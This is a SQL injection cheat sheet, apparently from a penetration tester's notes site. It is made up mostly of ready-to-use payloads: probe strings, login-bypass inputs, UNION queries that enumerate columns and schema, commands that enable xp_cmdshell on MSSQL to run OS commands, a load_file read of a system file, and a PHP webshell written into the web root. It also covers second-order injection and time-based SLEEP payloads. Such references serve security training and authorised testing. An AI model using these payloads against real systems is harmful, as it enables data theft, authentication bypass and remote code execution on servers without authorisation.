---
description: SQL Injection
---

# SQL Injection

> SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

### Identifying SQL Injection

First of all we need to find locations where data might pass through a database and use special SQL syntax in order to see how the application responds (usually we look for SQL syntax errors, different responses for boolean conditions or time delay responses).

<mark style="color:red;">**Important:**</mark> <mark style="color:red;"></mark><mark style="color:red;">Tamper every parameter of every request!</mark>

{% hint style="info" %}
**Integer parameters ->** Do not use quotes.

**String parameters ->** Use Single(') or Double(") quotes.
{% endhint %}

#### Examples:

```bash
#For http://site.com/?query={string/integer}, try: 
/?q=aaa' 
/?q=aaa" 
/?q=aaa" or 1=1--+ - 
/?q=[1] 
/?q=aaa` 
/?q=aaa\ 
/?q=aaa/*'*/ 
/?q=aaa/*!1111'*/ 
/?q=aaa'||'asd'||'
/?q=aaa' and '1'='1 
/?q='or''=' 
/?q=1 order by 1000-- -
/?q=1 and 1=1-- -
```

### Bypass Authentication

The classic SQLi example. By providing the following input in the user input we can bypass the login of a website:

<pre class="language-bash"><code class="lang-bash">username: nonexistent' or 1=1;#
password: asdasd

#If the above doesn't work, try limiting the returning rows of the query to 1:
<strong>username: nonexistent' or 1=1 LIMIT 1;#
</strong>password: asdasd
</code></pre>

### UNION Based

The "ORDER BY" statement can help us to enumerate how many columns are used in the query string. If there is at least 'n' columns in the query, the query is valid and the page will render without errors.

{% code overflow="wrap" %}
```bash
#1. Enumerate number of columns used in the query:
php?id=1 order by 1-- - #No error
php?id=1 order by 2-- - #No error
php?id=1 order by 3-- - #No error
php?id=1 order by 4-- - #Error (3 columns are used)

#2. Find which columns are displayed in the webpage:
php?id=-1 union select 1111,22222,33333-- - #Find these numbers on the web response

#3. Extract data (example where column 3 is displaying the data):
#SQL Version
php?id=-1 union all select 1, 2, @@version-- -
#Information schema. It stores information about the database, like table and column names:
php?id=-1 union all select 1, 2, table_name from information_schema.tables-- -
#Column names from a specific table (users):
php?id=-1 union all select 1, 2, column_name from information_schema.columns where table_name='users'-- -
```
{% endcode %}

### SQL Injection to RCE

#### MSSQL:

{% code overflow="wrap" %}
```bash
#Check if xp_cmdshell is enabled. Else, enable it. This can output some errors, but the file should be created
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands:
EXEC master..xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig'; //without master.. still works.
```
{% endcode %}

#### MySQL:

MySQL doesn't have a procedure like MSSQL "xp\_cmdshell", but if we have the right privileges (read/write) we can try to read sensitive files or place a webshell.

{% code overflow="wrap" %}
```bash
#Read file:
php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#Write file (webshell):
php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
{% endcode %}

### Second order SQL Injection

We can try to create the following user and then log in to see if we get anything interesting:

```bash
#Register the following user:
username: username' or 1=1-- -
password: whatever
#Then try to log in with the above username/password.
```

### Order By clause in url / body params

Look for SQL injection in "Order By" clause in query / body params.&#x20;

{% code overflow="wrap" %}
```bash
#https://twitter.com/therceman/status/1561379694930526210
#Example 1: 
orderby=asc,(SQL PAYLOAD)

#Example 2:
/admin.php?page=tp_editor&order=asc,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END))
```
{% endcode %}

### SQL Injection Troubles

#### Parameter is being passed to a function

It is probably that the parameter is being passed to a function. Try adding ")" to see if it works:

```
php?q=aaa' or 1=1-- - #This doesn't work
php?q=aaa' or 1=1)-- - #This works
```

